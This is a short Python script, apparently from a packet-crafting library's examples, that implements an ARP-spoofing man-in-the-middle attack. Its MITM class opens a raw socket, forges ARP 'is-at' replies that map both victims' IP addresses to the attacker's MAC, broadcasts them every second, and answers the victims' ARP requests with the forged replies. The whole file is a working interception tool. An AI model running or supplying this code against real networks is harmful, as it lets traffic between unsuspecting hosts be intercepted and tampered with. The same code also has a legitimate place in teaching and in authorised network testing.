from agave.frames import ethernet, arp
from agave.frames.core import Buffer
from ipaddress import ip_address, IPv4Address
import select
import socket
import time


def main(argv):
	try:
		MITM(*tuple(argv)).run()
	except KeyboardInterrupt as e:
		pass


class MITM:

	def __init__(self, iface, my_mac, alice_mac, alice_ip, bob_mac, bob_ip):
		self.rawsocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
		self.bob_ip = ip_address(bob_ip)
		self.alice_ip = ip_address(alice_ip)
		self.message_for_bob = arp.ARP.is_at(
			ethernet.str_to_mac(my_mac), self.alice_ip,
			ethernet.str_to_mac(bob_mac), self.bob_ip
		)
		self.message_for_alice = arp.ARP.is_at(
			ethernet.str_to_mac(my_mac), self.bob_ip,
			ethernet.str_to_mac(alice_mac), self.alice_ip
		)
		self.gratuitous_timeout = 1
		self.last_gratuitous = time.time()
		self.interface = (iface, 1)
		self.bob_ip = self.bob_ip.packed
		self.alice_ip = self.alice_ip.packed

	def send_gratuitous(self):
		self.rawsocket.sendto(self.message_for_bob, self.interface)
		self.rawsocket.sendto(self.message_for_alice, self.interface)
		self.last_gratuitous = time.time()

	def should_send_gratuitous(self):
		return self.gratuitous_timeout < (time.time() - self.last_gratuitous)

	def process(self, buf):
		eth_frame = ethernet.Ethernet.read_from_buffer(buf)
		if eth_frame.next_header == ethernet.ETHER_TYPE_ARP:
			arp_frame = arp.ARP.read_from_buffer(buf)
			if arp_frame.operation == arp.OPERATION_REQUEST:
				# if alice requests bob's mac
				if (arp_frame.target_protocol_address == self.bob_ip and
						arp_frame.sender_protocol_address == self.alice_ip):
					self.rawsocket.sendto(self.message_for_alice, self.interface)
				# if bob requests alice's mac
				elif (arp_frame.target_protocol_address == self.alice_ip and
						arp_frame.sender_protocol_address == self.bob_ip):
					self.rawsocket.sendto(self.message_for_bob, self.interface)

	def run(self):
		self.send_gratuitous()
		while True:
			rl, wl, xl = select.select([self.rawsocket], [], [], self.gratuitous_timeout)
			if rl != []:
				self.process(Buffer.from_bytes(self.rawsocket.recv(65535)))
			if self.should_send_gratuitous():
				self.send_gratuitous()
